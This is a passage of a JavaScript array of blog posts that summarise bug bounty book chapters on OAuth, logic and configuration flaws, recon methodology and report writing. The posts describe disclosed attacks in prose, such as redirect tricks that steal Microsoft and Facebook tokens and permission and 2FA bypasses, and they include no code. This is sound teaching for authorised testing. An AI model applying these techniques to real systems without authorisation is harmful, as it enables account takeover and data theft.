[+] Takeaways
Flurry added a custom account-creation POST request after OAuth login and reused its normal registration flow, setting a default password of "not-provided" to satisfy a required field. This insecure shortcut created the vulnerability, highlighting the risk of poorly implemented custom OAuth steps.

## Stealing Microsoft Login Tokens
[-] Difficulty: High
[-] URL: https://login.microsoftonline.com
[-] Source: https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/
[-] Date reported: January 24, 2016
[-] Bounty paid: $13,000

In 2016, Jack Whitton found a token-stealing flaw in Microsoft’s login flow by manipulating the wreply redirect parameter. By double-encoding characters and appending @example.com, he exploited improper URL validation and decoding, causing authentication tokens to be sent to an attacker-controlled domain. The issue stemmed from inconsistent decoding and whitelist validation during the redirect process.

[+] Takeaways
When testing OAuth redirects, append @example.com—especially with encoded characters, and watch for subtle error differences. Jack Whitton used this technique to uncover flawed redirect validation in Microsoft’s login flow.

## Swiping Facebook Official Access Tokens
[-] Difficulty: High
[-] URL: https://www.facebook.com
[-] Source: http://philippeharewood.com/swiping-facebook-official-access-tokens/
[-] Date reported: February 29, 2016
[-] Bounty paid: Undisclosed

Philippe Harewood couldn’t find flaws in Facebook’s OAuth flow, so he targeted a forgotten, preauthorized Facebook app that used an abandoned domain. After registering the unused whitelisted redirect domain, he captured OAuth tokens from any user who visited the authorization URL—gaining full access to their Facebook accounts and related services like Instagram.

[+] Takeaways
Check for forgotten assets (unused apps, subdomains, dependencies). If attackers can take them over, they may compromise the app, like Philippe Harewood did with a forgotten Facebook app. Always test with a clear goal in mind.


## Summary
OAuth is standardized but often misconfigured, allowing attackers to steal tokens and access user data. Thoroughly test redirect_uri validation, watch for insecure custom implementations, and check for forgotten or overly trusted whitelisted assets that could be abused.


[+] See you in next chapter!
    `
  },
  {
    id: 118,
    title: "Chapter 18: Application Logic & Configuration Vulner a bilities",
    excerpt: "Application logic flaws are coding mistakes that enable unintended actions; configuration flaws result from insecurely set up tools...",
    date: "2023-06-02",
    readTime: "12 min read",
    author: "Hacker00x1",
    image: "/blog-images/Application Logic and Configuration Vulner a bilities.png",
    content: `
## Introduction
Application logic and configuration flaws result from insecure coding or default settings. Egor Homakov exposed a mass assignment issue in Ruby on Rails, exploiting it on GitHub. These vulnerabilities require deep framework knowledge to identify.

## Bypassing Shopify Administrator Privileges
[-] Difficulty: Low
[-] URL: <shop>.myshopify.com/admin/mobile_devices.json
[-] Source: https://hackerone.com/reports/100938/
[-] Date reported: November 22, 2015
[-] Bounty paid: $500

Like GitHub, Shopify uses Ruby on Rails, which doesn’t enforce permissions by default. A researcher discovered that Shopify’s “Settings” permission only hid the phone number field in the UI but didn’t block backend requests. By replaying the HTTP request without permission, they successfully added a phone number, revealing a backend authorization flaw (an application logic vulnerability).

[+] Takeaways
When testing Ruby on Rails apps, always check user permissions and replay hidden HTTP requests, since backend authorization checks are often missing.

## Bypassing Twitter Account Protections
[-] Difficulty: Easy
[-] URL: https://twitter.com
[-] Source: N/A
[-] Date reported: October 2016
[-] Bounty paid: $560

When testing, compare website and mobile app behavior. Twitter required extra verification for new IP logins on its website but not on its mobile app. Researcher Aaron Ullger showed attackers could bypass the extra check via mobile, exposing an application logic flaw.

[+] Takeaways
Always verify that security controls behave consistently across platforms—web, mobile, third-party apps, and APIs. Differences between them can introduce application logic vulnerabilities if protections aren’t uniformly enforced.

## Platform Signal Manipulation
[-] Difficulty: Low
[-] URL: #
[-] Source: #
[-] Date reported: December 21, 2015
[-] Bounty paid: $500

Test edge cases and feature interactions. On one platform, a researcher found users could inflate their reputation score by self-closing reports, exposing a logic flaw that was later fixed.

[+] Takeaways
Watch for new features, they introduce fresh code and can unintentionally affect existing functionality. In this case, the interaction between self-closed reports and a new scoring feature created an application logic flaw.

## Incorrect S3 Bucket Permissions
[-] Difficulty: Medium
[-] URL: [REDACTED].s3.amazonaws.com
[-] Source: #
[-] Date reported: April 3, 2016
[-] Bounty paid: $2,500

Don’t assume all bugs are already found. While testing one platform, a researcher discovered a publicly writeable Amazon Simple Storage Service bucket by guessing bucket names and testing permissions. The misconfiguration was confirmed and fixed.

[+] Takeaways
Even skilled teams can make mistakes. Don’t feel intimidated—test thoroughly. Pay special attention to easily misconfigured third-party services like Amazon Simple Storage Service, and study public write-ups to understand how others discovered similar vulnerabilities.

## Bypassing GitLab Two-Factor Authentication
[-] Difficulty: Medium
[-] URL: N/A
[-] Source: https://hackerone.com/reports/128085/
[-] Date reported: April 3, 2016
[-] Bounty paid: N/A

Two-factor authentication (2FA) adds an extra login step but can be vulnerable if poorly implemented. In 2016, GitLab had a flaw where an attacker could modify a login request to trigger an OTP for another user without knowing their password. If the attacker guessed the valid one-time code, they could log in. Although difficult to exploit due to short-lived OTPs, the issue was confirmed and quickly fixed.

[+] takeaways
2FA is easy to misconfigure, so test token lifetimes, rate limits, reuse, and guessability. In GitLab, manipulating exposed parameters led to a bypass.

## Yahoo! PHP Info Disclosure
[-] Difficulty: Medium
[-] URL: http://nc10.n9323.mail.ne1.yahoo.com/phpinfo.php/
[-] Source: https://blog.it-securityguard.com/bugbounty-yahoo-phpinfo-php-disclosure-2/
[-] Date reported: October 16, 2014
[-] Bounty paid: N/A

In 2014, a researcher scanned IP ranges owned by Yahoo! and found a publicly accessible phpinfo() page exposing sensitive configuration details. It shows how automation and network scanning can uncover dangerous misconfigurations.

[+] Takeaways
Test the full in-scope infrastructure and automate whenever possible—large ranges, like in the Yahoo! case, can’t be checked manually.

## Platform Hacktivity Voting
[-] Difficulty: Medium
[-] URL: #
[-] Source: #
[-] Date reported: May 10, 2016
[-] Bounty paid: Swag

In 2016, a hacker found hidden voting functionality on a platform by analyzing its JavaScript.
Although the feature wasn’t enabled in the UI, the JS revealed /votes POST and DELETE endpoints. By modifying server responses and sending requests directly, the hacker could use the unfinished voting feature.

It shows how reviewing JavaScript files can uncover hidden or unprotected functionality.

[+] Takeaways
When a site relies on frameworks like React or AngularJS, reviewing JavaScript files can reveal hidden endpoints and new areas to test. Tools like JSParser can help track changes and uncover exposed functionality.

## Accessing PornHub’s Memcache Installation
[-] Difficulty: Medium
[-] URL: stage.pornhub.com
[-] Source: https://blog.zsec.uk/pwning-pornhub/
[-] Date reported: March 1, 2016
[-] Bounty paid: $2,500

While testing Pornhub’s in-scope subdomains, a researcher found that a staging server had an exposed Memcache service running on an open port without authentication, revealing a configuration weakness that could have been serious depending on what data was stored in the cache.

[+] Takeaways
Enumerate in-scope subdomains and use tools like EyeWitness and Nmap to quickly uncover hidden services and configuration flaws others may miss.


## Summary
Logic and configuration flaws often surface when you test applications from different angles, like bypassing permission checks, as seen with Shopify and Twitter. New features and JavaScript files are especially valuable targets because they may introduce edge cases or hidden functionality. Since manual testing is slow, automation tools like Nmap and EyeWitness can greatly improve efficiency.


[+] See you in next chapter!
    `
  },
  {
    id: 119,
    title: "Chapter 19: Finding Your Own Bug Bounties",
    excerpt: "There’s no magic formula for hacking, technologies constantly evolve, and no guide can cover every method...",
    date: "2023-06-02",
    readTime: "12 min read",
    author: "Hacker00x1",
    image: "/blog-images/Finding Your Own Bug Bounties.png",
    content: `
## Introduction
There’s no magic formula for hacking, technologies constantly evolve, and no guide can cover every method. Instead, focus on learning the patterns successful bug hunters follow and building hands-on experience. Early on, measure success by what you learn rather than the bugs or money you earn. Mature programs like Uber, Shopify, Twitter, and Google are heavily tested, making bugs harder to find. Staying focused on skill development and pattern recognition helps you stay motivated during slow periods.

[+] Reconnaissance
Begin bug bounty testing with recon: define the scope, enumerate subdomains and IPs, and identify the technologies in use. Run background tools early, and use a VPS that permits security testing to avoid getting blocked by services like Akamai.

[+] Subdomain Enumeration
For open scopes, enumerate subdomains with tools like SubFinder and check certificate logs on crt.sh. Use wordlists to brute-force hidden or wildcard subdomains, then port-scan and screenshot findings, also consider enumerating deeper subdomain levels to expand your attack surface.

[+] After finding subdomains, use tools like Nmap or Masscan to port-scan for exposed services. Look for unusual open ports or IP outliers, especially those not hosted on common providers like Amazon Web Services or Google Cloud—as they may reveal weaker infrastructure.

[+] Screenshotting
After listing subdomains, screenshot them to quickly spot patterns and anomalies. Look for takeover-related error messages, exposed third-party services, unusual login pages, default installs, or apps that differ from the company’s typical tech stack. These inconsistencies can signal misconfigurations or custom systems worth deeper testing. Tools like HTTPScreenShot, Gowitness, and Aquatone help automate screenshots, cluster similar results, and capture useful HTTP header data.

[+] Content Discovery
After recon, use content discovery techniques like directory brute-forcing with tools such as Gobuster or Burp Suite Pro and strong wordlists like SecLists. You can also use Google dorks (see Exploit Database) and review repositories on GitHub to uncover exposed files, secrets, or vulnerable third-party dependencies.

[+] Previous Bugs
Before testing, review past bugs—read write-ups, disclosed reports, CVEs, and exploits. Fixes often introduce new code, which can create new vulnerabilities. For example, a bounty in Shopify was found by retesting functionality from a previously disclosed report. Recon is ongoing, applications evolve, so revisiting targets can uncover new issues.

## Testing the Application
There’s no universal method for testing, your approach depends on the application and its scope. Adapt your techniques to the target, but keep the right mindset. As Matthias Karlsson advises: treat every target like no one has tested it before. If you find nothing, move on and keep learning.

  [+] The Technology Stack
  Start by identifying the site’s technologies using proxy traffic and tools like Wappalyzer, then explore functionality with Burp Suite to spot patterns. Focus on likely weaknesses, such as IDORs in apps, exposed JSON/XML data, risky file uploads (XXE), misconfigured third-party services, encoded parameters, and custom OAuth flows.

  [+] Functionality Mapping
  After identifying the tech stack, map functionality by either spotting vulnerability markers (like webhooks or file uploads), testing toward a specific goal (as advocated by Jobert Abma), or following checklists such as those from OWASP.
  
  [+] Finding Vulnerabilities
  After mapping the app, focus on manual testing—use it like a real user, send polyglot payloads, and watch for unusual behavior. Check for common issues like IDOR, CSRF, SSRF, XSS, SQLi, and RCE, and review proxy traffic in tools like Burp Suite. Successful bug hunting relies on observation and persistence.

## Going Further
Once you’ve completed your recon and have thoroughly tested all the functionality you can find, you should research other ways to make your bug search more efficient. Although I can’t tell you how to do that in all situations, I do have some suggestions.

  [+] Automating Your Work
  Automation helps overcome time limits by letting computers handle repetitive tasks. For example, a researcher quickly found a bug on Shopify by automating subdomain monitoring. While not required for success, automating recon—like subdomain brute-forcing, port scanning, and screenshotting—can significantly increase efficiency and potential rewards.

  [+] Looking at Mobile Apps
  Mobile apps in scope offer additional attack surface. You can test the app code itself or, more commonly, the APIs it uses—focusing on web-style flaws like IDOR, SQLi, and RCE. To do this, proxy your phone’s traffic through tools like Burp Suite to inspect and modify HTTP requests. Be aware of SSL pinning, which can block interception and requires extra steps to bypass.

  [+] Identifying New Fuctionality
  Focus on identifying new features as they launch, since fresh code often contains fresh bugs. Hackers like Philippe Harewood have found success by quickly testing new functionality in programs such as Facebook. Monitor engineering blogs, social media, and newsletters to stay ahead.

  [+] Tracking JavaScript Files
  Tracking JavaScript files is a strong way to spot new or changed functionality, especially in apps that rely heavily on frontend frameworks. Since many HTTP endpoints are embedded in JS, file updates can reveal new features to test. Researchers like Jobert Abma, Brett Buerhaus, and Ben Sadeghipour have shared effective methods for using this technique in reconnaissance.

  [+] Paying for Access to New Functionality
  It can be worthwhile to pay for premium features, subscriptions, or products to expand your testing scope. Researchers like Frans Rosen and Ron Chan have found valuable bugs by accessing paid functionality that fewer hackers test. Since many avoid spending money, these areas often contain less-scrutinized vulnerabilities.

  [+] Learning the Technology
  Deeply understanding the technologies a company uses can uncover powerful bugs. For example, exploiting issues in ImageMagick requires knowing how it handles file types, which led researchers to related flaws in Ghostscript, as shown by Tavis Ormandy. Similarly, studying standards like OAuth—or even reading RFCs, helps you spot gaps between how a technology should work and how it’s actually implemented.


## Summary
Successful bug hunting comes from exploring a target, understanding its functionality, and mapping it to likely vulnerability types. Improve efficiency through automation and by documenting your methodology. Tools like Burp Suite, OWASP ZAP, Nmap, and Gowitness can streamline your workflow. When common paths are exhausted, dig deeper into mobile apps and newly released functionality for fresh opportunities.


[+] See you in next chapter!
    `
  },
  {
    id: 120,
    title: "Chapter 20: Vulnerability Reports",
    excerpt: "Congrats on finding your first vulnerability! Take a breath, rushing a report can lead to mistake or rejection, which may even lower your reputation on some platforms...",
    date: "2023-06-02",
    readTime: "10 min read",
    author: "Hacker00x1",
    image: "/blog-images/Vulnerability Reports.png",
    content: `
## Introduction
Congrats on finding your first vulnerability! Take a breath, rushing a report can lead to mistakes or rejection, which may even lower your reputation on some platforms. This chapter focuses on helping you write clear, effective bug reports to avoid invalid submissions and improve your chances of success.

## Read the Policy
Always read a bug bounty program’s policy before submitting a vulnerability to ensure the issue is in scope and not already known. The author learned this the hard way after reporting a known XSS issue on Shopify, which was marked invalid and cost them reputation points.

## Include Details; Then Include More
A good vulnerability report should include the affected URL and parameters, your testing environment, a clear description of the issue, steps to reproduce it, its potential impact, and a recommended fix. Adding screenshots or a short video as proof strengthens the report. The severity should also be evaluated based on the context and sensitivity of the affected platform.

## Reconfirm the Vulnerability
Before submitting a vulnerability report, make sure the issue is truly valid by double-checking your findings. Verify that what appears to be a flaw isn’t caused by misunderstanding how the application works, and confirm it hasn’t already been fixed. Even experienced researchers like Mathias Karlsson have nearly reported invalid bugs after overlooking details such as system updates. Always thoroughly test and reconfirm your results to avoid submitting inaccurate reports.

## Your Reputation
Before submitting a bug, ask yourself whether you’d be proud to publicly stand behind the report. Submitting low-quality or invalid findings can damage your reputation and waste everyone’s time. On bug bounty platforms, your statistics are tracked and influence invitations to private, often more lucrative programs. A single invalid report can lower your stats and limit opportunities, so protecting your credibility is essential in bug bounty work.

## Show Respect for the Company
Companies may need time to triage and fix vulnerabilities, especially in public bug bounty programs with many reports. Give them a few business days before following up and communicate politely. Clear, detailed reports reduce delays, and understanding the challenges triagers face—such as limited resources and development cycles, helps build better long-term relationships with programs.

## Appealing Bounty Rewards
If you disagree with a bounty amount, respect the company’s decision but politely ask for clarification and explain why you believe the reward should be higher. Provide clear reasoning rather than simply requesting more money. Companies may explain their assessment, correct a misclassification, or adjust the payout. If helpful, reference similar reports from the same company to support your expectations, but avoid comparing payouts across different organizations.


## Summary
Successful bug bounty work requires clear reports, careful validation of findings, and professional communication. Double-check vulnerabilities before submitting, be respectful when discussing payouts, and empathize with triagers. Your reputation on bug bounty platforms directly impacts future opportunities, including invitations to private programs.


[+] That's all! I hope this chapter was quick and thought-provoking. Remember, writing clear, effective bug reports is a skill that takes practice. Keep exploring, keep reporting, and keep improving your skills.
    `
  }
];
